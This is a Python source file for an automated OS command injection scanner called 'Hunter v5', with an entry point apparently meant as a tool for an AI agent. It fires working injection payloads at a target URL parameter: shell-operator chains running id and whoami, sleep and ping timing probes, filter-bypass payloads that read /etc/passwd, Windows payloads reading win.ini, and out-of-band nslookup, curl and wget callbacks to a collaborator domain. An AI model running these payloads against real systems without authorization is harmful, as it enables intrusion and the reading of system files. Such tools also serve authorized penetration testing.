"""
Hunter v5 — Auto Command Injection Engine

Automates OS command injection detection:
1. Operator-based injection (|, ;, &&, ||, ``)
2. Time-based blind detection (ping/sleep)
3. Output-based detection (id, whoami, cat /etc/passwd)
4. Filter bypass techniques
"""

import re
import time
try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s


class AutoCMD:
    """Automated command injection detection engine."""

    def __init__(self, base_url: str, param: str = "ip",
                 method: str = "GET", session=None):
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.session = session or _get_session()
        self.vulnerable = False
        self.injection_type = None
        self.working_payload = None
        self.findings = []

    def _send(self, payload: str) -> dict:
        """Send payload and return response."""
        try:
            if self.method == "GET":
                from urllib.parse import quote
                url = f"{self.base_url}?{self.param}={quote(payload)}"
                resp = self.session.get(url, timeout=15, allow_redirects=False)
            else:
                resp = self.session.post(self.base_url,
                                         data={self.param: payload},
                                         timeout=15, allow_redirects=False)
            return {
                "status": resp.status_code,
                "body": resp.text,
                "length": len(resp.text),
                "time": resp.elapsed.total_seconds() if hasattr(resp, 'elapsed') else 0,
            }
        except Exception as e:
            return {"status": 0, "body": "", "error": str(e), "time": 0}

    def _get_baseline(self) -> dict:
        """Get baseline response."""
        return self._send("127.0.0.1")

    def test_operator_injection(self) -> dict:
        """Test command injection via shell operators."""
        # Operators: |, ;, &&, ||, ``, $()
        operators = [
            ("pipe", "|id"),
            ("semicolon", ";id"),
            ("and", "&&id"),
            ("or", "||id"),
            ("backtick", "`id`"),
            ("dollar_paren", "$(id)"),
            ("newline", "%0aid"),
            ("pipe_space", "| id"),
            ("semicolon_space", "; id"),
        ]

        # Linux indicators
        linux_indicators = ["uid=", "gid=", "groups=", "root", "/bin/bash", "/bin/sh"]
        # Windows indicators
        windows_indicators = ["NT AUTHORITY", "SYSTEM", "Administrator", "C:\\"]

        results = []
        for name, suffix in operators:
            payload = f"127.0.0.1{suffix}"
            result = self._send(payload)
            body = result.get("body", "")

            found_linux = any(ind in body for ind in linux_indicators)
            found_windows = any(ind in body for ind in windows_indicators)

            if found_linux or found_windows:
                self.vulnerable = True
                self.injection_type = f"operator_{name}"
                self.working_payload = payload
                os_type = "linux" if found_linux else "windows"
                self.findings.append({
                    "type": "command_injection",
                    "technique": name,
                    "os": os_type,
                    "severity": "critical",
                    "payload": payload,
                })
                results.append({"technique": name, "vulnerable": True, "os": os_type, "payload": payload})
                return {"tested": len(results), "vulnerable": True, "results": results}
            else:
                results.append({"technique": name, "vulnerable": False})

        return {"tested": len(results), "vulnerable": False, "results": results}

    def test_time_based(self) -> dict:
        """Test time-based blind command injection."""
        baseline = self._send("127.0.0.1")
        base_time = baseline.get("time", 0)

        time_payloads = [
            ("sleep_5", "|sleep 5"),
            ("sleep_5_semi", ";sleep 5"),
            ("sleep_5_and", "&&sleep 5"),
            ("ping_10", "|ping -c 10 127.0.0.1"),
            ("ping_10_win", "|ping -n 10 127.0.0.1"),
            ("timeout_win", "|timeout /t 5"),
        ]

        results = []
        for name, suffix in time_payloads:
            payload = f"127.0.0.1{suffix}"
            result = self._send(payload)
            elapsed = result.get("time", 0)

            # If response took >4 seconds, likely vulnerable
            if elapsed > 4.0:
                self.vulnerable = True
                self.injection_type = f"time_based_{name}"
                self.working_payload = payload
                self.findings.append({
                    "type": "command_injection_blind",
                    "technique": name,
                    "severity": "critical",
                    "timing": f"{elapsed:.1f}s vs {base_time:.1f}s baseline",
                })
                results.append({"technique": name, "vulnerable": True, "elapsed": elapsed})
                return {"tested": len(results), "vulnerable": True, "results": results}
            else:
                results.append({"technique": name, "vulnerable": False, "elapsed": elapsed})

        return {"tested": len(results), "vulnerable": False, "results": results}

    def test_newline_injection(self) -> dict:
        """Test injection via newline characters (bypasses some filters)."""
        newline_payloads = [
            ("crlf", "127.0.0.1%0d%0aid"),
            ("lf", "127.0.0.1%0aid"),
            ("cr", "127.0.0.1%0did"),
        ]

        linux_indicators = ["uid=", "gid=", "root"]

        results = []
        for name, payload in newline_payloads:
            result = self._send(payload)
            body = result.get("body", "")

            if any(ind in body for ind in linux_indicators):
                self.vulnerable = True
                self.injection_type = f"newline_{name}"
                self.working_payload = payload
                self.findings.append({
                    "type": "command_injection_newline",
                    "technique": name,
                    "severity": "critical",
                })
                results.append({"technique": name, "vulnerable": True})
                return {"tested": len(results), "vulnerable": True, "results": results}

            results.append({"technique": name, "vulnerable": False})

        return {"tested": len(results), "vulnerable": False, "results": results}

    def test_bypass(self) -> dict:
        """Test filter bypass techniques."""
        bypass_payloads = [
            ("space_bypass", "127.0.0.1;{cat,/etc/passwd}"),
            ("ifs_bypass", "127.0.0.1;${IFS}cat${IFS}/etc/passwd"),
            ("tab_bypass", "127.0.0.1;%09id"),
            ("hex_bypass", "127.0.0.1;`echo 6964`"),  # 6964 = 'id' in hex
            ("base64_bypass", "127.0.0.1;`echo aWQ=|base64 -d`"),
            ("wildcard_bypass", "127.0.0.1;/???/??t /???/p?ss??"),
            ("quote_bypass", "127.0.0.1;w'h'o'am'i"),
            ("dollar_bypass", "127.0.0.1;w$@ho$@am$@i"),
        ]

        linux_indicators = ["uid=", "gid=", "root", "/bin/bash"]

        results = []
        for name, payload in bypass_payloads:
            result = self._send(payload)
            body = result.get("body", "")

            if any(ind in body for ind in linux_indicators):
                self.vulnerable = True
                self.injection_type = f"bypass_{name}"
                self.working_payload = payload
                self.findings.append({
                    "type": "command_injection_bypass",
                    "technique": name,
                    "severity": "critical",
                })
                results.append({"technique": name, "vulnerable": True})
                return {"tested": len(results), "vulnerable": True, "results": results}

            results.append({"technique": name, "vulnerable": False})

        return {"tested": len(results), "vulnerable": False, "results": results}

    def test_oob_dns(self, collaborator_domain: str) -> dict:
        """Test blind command injection via DNS callback.

        Uses nslookup/ping to trigger DNS lookup to collaborator domain.
        """
        oob_payloads = [
            ("nslookup_pipe", f"|nslookup {collaborator_domain}"),
            ("nslookup_semi", f";nslookup {collaborator_domain}"),
            ("nslookup_and", f"&&nslookup {collaborator_domain}"),
            ("nslookup_or", f"||nslookup {collaborator_domain}"),
            ("nslookup_backtick", f"`nslookup {collaborator_domain}`"),
            ("nslookup_dollar", f"$(nslookup {collaborator_domain})"),
            ("ping_pipe", f"|ping -c 1 {collaborator_domain}"),
            ("curl_pipe", f"|curl http://{collaborator_domain}"),
            ("wget_pipe", f"|wget http://{collaborator_domain}"),
        ]

        for name, payload in oob_payloads:
            result = self._send(payload)
            if result.get("status") == 200:
                return {
                    "vulnerable": True,
                    "technique": "oob_dns",
                    "payload": payload,
                    "note": f"Check Collaborator for DNS callback from {collaborator_domain}",
                }

        return {"vulnerable": False, "technique": "oob_dns"}

    def test_windows_specific(self) -> dict:
        """Test Windows-specific command injection."""
        windows_payloads = [
            ("dir_pipe", "|dir"),
            ("dir_semi", ";dir"),
            ("type_pipe", "|type C:\\windows\\win.ini"),
            ("ipconfig_pipe", "|ipconfig"),
            ("whoami_pipe", "|whoami"),
        ]

        for name, payload in windows_payloads:
            result = self._send(payload)
            body = result.get("body", "")
            if any(x in body.lower() for x in ["windows", "program files", "users", "inetpub"]):
                self.vulnerable = True
                self.injection_type = "windows"
                self.working_payload = payload
                return {
                    "vulnerable": True,
                    "technique": "windows",
                    "payload": payload,
                    "evidence": body[:200],
                }

        return {"vulnerable": False, "technique": "windows"}

    def run_full_scan(self) -> dict:
        """Run complete automated command injection scan."""
        start = time.time()
        results = {"target": self.base_url, "param": self.param, "steps": []}

        # Step 1: Operator-based injection
        op_result = self.test_operator_injection()
        results["operator_injection"] = op_result
        results["steps"].append({"step": "operator_injection", "result": op_result})

        # Step 2: Time-based blind (if operator failed)
        if not self.vulnerable:
            time_result = self.test_time_based()
            results["time_based"] = time_result
            results["steps"].append({"step": "time_based", "result": time_result})

        # Step 3: Newline injection (if still not found)
        if not self.vulnerable:
            nl_result = self.test_newline_injection()
            results["newline_injection"] = nl_result
            results["steps"].append({"step": "newline_injection", "result": nl_result})

        # Step 4: Bypass techniques
        if not self.vulnerable:
            bypass_result = self.test_bypass()
            results["bypass"] = bypass_result
            results["steps"].append({"step": "bypass", "result": bypass_result})

        results["vulnerable"] = self.vulnerable
        results["injection_type"] = self.injection_type
        results["working_payload"] = self.working_payload
        results["findings"] = self.findings
        results["elapsed_ms"] = int((time.time() - start) * 1000)

        return results


def auto_cmd_impl(base_url: str, param: str = "ip", method: str = "GET") -> dict:
    """Run automated command injection scan. Entry point for MCP tool."""
    engine = AutoCMD(base_url, param, method)
    return engine.run_full_scan()
